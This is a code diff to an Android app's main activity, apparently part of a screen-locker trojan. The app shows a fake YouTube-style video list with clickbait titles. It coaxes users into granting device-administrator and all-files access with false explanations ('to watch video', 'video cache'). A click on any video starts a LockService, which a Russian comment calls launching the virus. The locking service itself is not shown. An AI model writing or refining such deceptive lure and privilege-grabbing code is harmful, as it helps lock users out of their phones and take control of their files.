@@ -22,13 +22,45 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         setContentView(R.layout.activity_main);
-
-        generateVideos();
+        
+        // Сначала проверяем права (Админ и Файлы)
         checkPermissions();
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        checkPermissions();
+    }
+
+    private void checkPermissions() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
+
+        // 1. Запрос прав Админа
+        if (!dpm.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Для просмотра видео");
+            startActivityForResult(intent, ADMIN_INTENT);
+            return;
+        }
+
+        // 2. Запрос прав на файлы
+        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
+            Toast.makeText(this, "Нужен доступ к памяти для кэша видео", Toast.LENGTH_LONG).show();
+            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
+            return;
+        }
+
+        // 3. Если всё разрешено — показываем YouTube
+        generateVideos();
     }
 
     private void generateVideos() {
         LinearLayout list = findViewById(R.id.videoList);
+        list.removeAllViews(); // Очищаем, чтобы не дублировалось
+
         String[] titles = {
             "Как взломать Пентагон за 5 минут",
             "СМОТРЕТЬ ДО КОНЦА! ШОК!",
@@ -48,7 +80,7 @@ public class MainActivity extends Activity {
             videoView.setPadding(15, 15, 15, 15);
             
             View thumb = new View(this);
-            thumb.setBackgroundColor(0xFF212121);
+            thumb.setBackgroundColor(0xFF212121); 
             LinearLayout.LayoutParams thumbParams = new LinearLayout.LayoutParams(
                     LinearLayout.LayoutParams.MATCH_PARENT, 400);
             thumb.setLayoutParams(thumbParams);
@@ -70,44 +102,13 @@ public class MainActivity extends Activity {
             videoView.setOnClickListener(new View.OnClickListener() {
                 @Override
                 public void onClick(View v) {
-                    if (checkAllPermissions()) {
-                        startService(new Intent(MainActivity.this, LockService.class));
-                        finish();
-                    } else {
-                        Toast.makeText(MainActivity.this, "Подождите, идет загрузка...", Toast.LENGTH_SHORT).show();
-                        checkPermissions();
-                    }
+                    // Запуск вируса при клике на видео
+                    startService(new Intent(MainActivity.this, LockService.class));
+                    finish();
                 }
             });
 
             list.addView(videoView);
-        }
-    }
-
-    private boolean checkAllPermissions() {
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
-        boolean isAdmin = dpm.isAdminActive(adminComponent);
-        boolean isFiles = Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager();
-        return isAdmin && isFiles;
-    }
-
-    private void checkPermissions() {
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
-
-        if (!dpm.isAdminActive(adminComponent)) {
-            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Для просмотра видео");
-            startActivityForResult(intent, ADMIN_INTENT);
-            return;
-        }
-
-        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-            Toast.makeText(this, "Нужен доступ к памяти для кэша видео", Toast.LENGTH_LONG).show();
-            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
-            return;
         }
     }
 
@@ -117,11 +118,5 @@ public class MainActivity extends Activity {
         if (requestCode == ADMIN_INTENT) {
             checkPermissions();
         }
-    }
-    
-    @Override
-    protected void onResume() {
-        super.onResume();
-        checkPermissions();
     }
 }
